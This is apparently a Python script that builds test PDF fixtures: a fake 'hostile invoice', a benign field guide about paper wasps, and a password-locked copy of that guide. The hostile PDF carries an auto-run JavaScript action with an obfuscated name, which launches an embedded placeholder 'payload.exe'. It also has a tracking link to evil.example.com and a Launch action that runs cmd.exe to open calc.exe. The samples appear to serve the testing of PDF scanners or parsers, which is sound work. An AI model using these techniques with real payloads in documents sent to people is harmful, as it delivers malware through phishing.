import os
out = os.path.dirname(os.path.abspath(__file__))

# --- hand-built hostile PDF with correct xref ---
objs = {}
objs[1] = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /EmbeddedFiles << /Names [(payload.exe) 7 0 R] >> >> /AcroForm << /Fields [] >> >>"
objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
objs[3] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 9 0 R >> >> /Annots [6 0 R 10 0 R] /AA << /O 5 0 R >> >>"
content = b"BT /F1 28 Tf 72 700 Td (Totally legitimate invoice) Tj ET BT /F1 14 Tf 72 660 Td (Click here to view your statement) Tj ET BT /F1 14 Tf 72 610 Td (Open attachment to pay) Tj ET"
objs[4] = b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream"
objs[5] = b"<< /Type /Action /S /J#61vaScript /JS (app.alert\\('pwned'\\); this.exportDataObject\\({cName:'payload.exe', nLaunch:2}\\);) >>"
objs[6] = b"<< /Type /Annot /Subtype /Link /Rect [72 650 300 680] /Border [0 0 0] /A << /S /URI /URI (http://evil.example.com/track?id=1) >> >>"
objs[7] = b"<< /Type /Filespec /F (payload.exe) /UF (payload.exe) /EF << /F 8 0 R >> >>"
payload = b"MZ\x90\x00this is not really an exe"
objs[8] = b"<< /Type /EmbeddedFile /Length %d >>\nstream\n" % len(payload) + payload + b"\nendstream"
objs[9] = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
objs[10] = b"<< /Type /Annot /Subtype /Link /Rect [72 600 300 630] /Border [0 0 0] /A << /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) /P (/c calc.exe) >> >> >>"
objs[11] = b"<< /Title (Q3 Invoice) /Author (Accounts Payable) /Producer (Totally Real PDF Writer 9.1) /CreationDate (D:20261001120000+00'00') >>"
buf = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
offsets = {}
for n in sorted(objs):
    offsets[n] = len(buf)
    buf += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
xref = len(buf)
buf += b"xref\n0 %d\n" % (len(objs) + 1)
buf += b"0000000000 65535 f \n"
for n in sorted(objs):
    buf += b"%010d 00000 n \n" % offsets[n]
buf += b"trailer\n<< /Size %d /Root 1 0 R /Info 11 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref)
open(os.path.join(out, 'hostile-invoice.pdf'), 'wb').write(buf)

# --- benign multi-page PDF with outline, links and text via reportlab ---
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.lib.units import cm
c = canvas.Canvas(os.path.join(out, 'field-guide.pdf'), pagesize=A4, invariant=1)
c.setTitle('A Field Guide to Paper Wasps')
c.setAuthor('M. Polistes')
c.setSubject('Natural history')
W, H = A4
chapters = ['Introduction', 'Nest architecture', 'Colony life', 'Foraging', 'Defence', 'Field notes']
lorem = ("Paper wasps build open combs from chewed wood fibre mixed with saliva. The cells hang downward and the "
         "queen tends the first brood alone until workers emerge. Unlike honeybees the colony is annual and dies "
         "back each autumn, leaving only mated females to overwinter. ")
page = 0
for ci, ch in enumerate(chapters):
    for p in range(2):
        page += 1
        key = f'ch{ci}p{p}'
        c.bookmarkPage(key)
        if p == 0:
            c.addOutlineEntry(ch, key, level=0)
        else:
            c.addOutlineEntry(f'{ch}, continued', key, level=1)
        c.setFont('Helvetica-Bold', 22)
        c.drawString(2.5*cm, H-3*cm, f'{ci+1}. {ch}' if p == 0 else f'{ch} (cont.)')
        c.setFont('Helvetica', 11)
        y = H - 4.5*cm
        words = (lorem * 6).split()
        line = ''
        for w in words:
            if c.stringWidth(line + ' ' + w, 'Helvetica', 11) > W - 5*cm:
                c.drawString(2.5*cm, y, line.strip()); y -= 15; line = ''
                if y < 4*cm: break
            line += ' ' + w
        if ci == 0 and p == 0:
            c.setFillColorRGB(0.1, 0.3, 0.7)
            c.drawString(2.5*cm, 3*cm, 'Further reading: wasps.example.org')
            c.linkURL('https://wasps.example.org/guide', (2.5*cm, 2.8*cm, 10*cm, 3.4*cm), relative=0)
            c.setFillColorRGB(0, 0, 0)
        c.setFont('Helvetica', 9)
        c.drawRightString(W - 2.5*cm, 1.8*cm, str(page))
        c.showPage()
c.save()


# --- locked copy of the field guide, user password "paper" ---
try:
    from pypdf import PdfReader, PdfWriter
    src = PdfReader(os.path.join(out, 'field-guide.pdf'))
    w = PdfWriter()
    for p in src.pages[:4]:
        w.add_page(p)
    w.add_metadata({'/Title': 'A Field Guide to Paper Wasps (locked)', '/Author': 'M. Polistes'})
    w.encrypt(user_password='paper', owner_password='wasp-owner', algorithm='AES-256')
    with open(os.path.join(out, 'locked-field-guide.pdf'), 'wb') as f:
        w.write(f)
except ImportError:
    print('pypdf not installed; skipping locked-field-guide.pdf')

print('ok', os.listdir(out))
